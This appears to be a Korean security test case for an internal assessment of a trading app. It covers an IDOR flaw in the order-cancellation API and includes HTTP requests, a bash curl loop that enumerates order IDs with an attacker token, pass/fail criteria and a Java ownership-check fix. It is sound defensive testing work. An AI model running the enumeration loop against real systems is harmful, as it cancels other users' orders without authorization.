================================================================================
[VCE-ORDERS-01] 주문 취소 IDOR → 타 사용자 주문 취소
도메인: orders (주문/거래내역)
================================================================================

## 1. 진단 항목 개요

- **항목명**: 주문 취소 IDOR (Insecure Direct Object Reference)
- **번호**: ORDERS-01
- **위험도**: High
- **OWASP**: A01:2021 – Broken Access Control

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/orders/{orderId} |
| 운영 | https://vceapp.com/api/orders/{orderId} |
| HTTP 메서드 | DELETE |
| 인증 요건 | Bearer JWT 필요 |

## 3. 취약점 원리 (Why this works)

주문 취소 시 orderId만으로 주문을 식별하고, 해당 주문이 요청자의 소유인지 검증하지 않으면
공격자는 타 사용자의 orderId를 대입하여 다른 사람의 주문을 취소할 수 있다.

orderId는 DB의 자동 증가 PK이므로 1, 2, 3... 순서로 예측 가능하다.

공격 시나리오:
1. 공격자가 자신의 주문을 생성 → orderId=100 확인
2. orderId=1~99를 순서대로 취소 시도
3. 타 사용자의 미체결 주문이 공격자에 의해 취소됨

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. 계정 A (test@vce.com) → 로그인 → JWT_A 획득
2. 계정 B (다른 계정) → 로그인 → 주문 생성 → orderId 확인
3. 계정 A JWT로 계정 B의 주문 취소 시도

---

### Step 1. 계정 B 주문 생성 (피해자 역할)

```
POST /api/orders HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT_B>
Content-Type: application/json

{
  "assetType": "BTC",
  "orderType": "BUY",
  "price": 50000000,
  "amount": 0.001
}
```

응답: `{"orderId": 42, ...}`

---

### Step 2. 계정 A의 JWT로 계정 B의 주문 취소 시도

```
DELETE /api/orders/42 HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT_A>
```

---

### Step 3. 순차적 orderId 탐색

```bash
JWT_A="<공격자_JWT>"

for id in $(seq 1 100); do
  result=$(curl -s -o /dev/null -w "%{http_code}" \
    -X DELETE http://localhost:8080/api/orders/$id \
    -H "Authorization: Bearer $JWT_A")
  echo "orderId=$id → HTTP $result"
done
```

HTTP 200: 취소 성공 (IDOR 확인)
HTTP 404: 주문 없음
HTTP 403: 권한 없음 (안전)

---

### Step 4. 내 주문 목록에서 타 사용자 주문 포함 여부 확인

```
GET /api/orders HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT_A>
```

응답에 다른 사용자 주문이 포함되는지 확인.

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- DELETE /api/orders/{타사용자_orderId} → HTTP 200 반환 + 주문 취소됨
- GET /api/orders 응답에 타 사용자 주문 포함

✗ **안전 (Not Vulnerable)**:
- HTTP 403 Forbidden: "다른 사용자의 주문에 접근할 수 없습니다"
- HTTP 404 Not Found (소유자 기반 조회로 존재 자체가 없는 것처럼 처리)

## 6. 예상 취약 포인트 (코드 위치)

- `OrderController.java:40-45` — DELETE /{orderId} 핸들러
- `OrderService.java` — cancelOrder 메서드에서 주문 소유자 검증 여부

## 7. 권고 조치

- 주문 취소 전 소유자 확인:
  ```java
  Order order = orderRepository.findById(orderId)
      .orElseThrow(() -> new NotFoundException("주문을 찾을 수 없습니다"));
  if (!order.getMember().getEmail().equals(userEmail)) {
      throw new ForbiddenException("권한이 없습니다");
  }
  ```
- 주문 조회 시 항상 현재 사용자 email 조건 포함
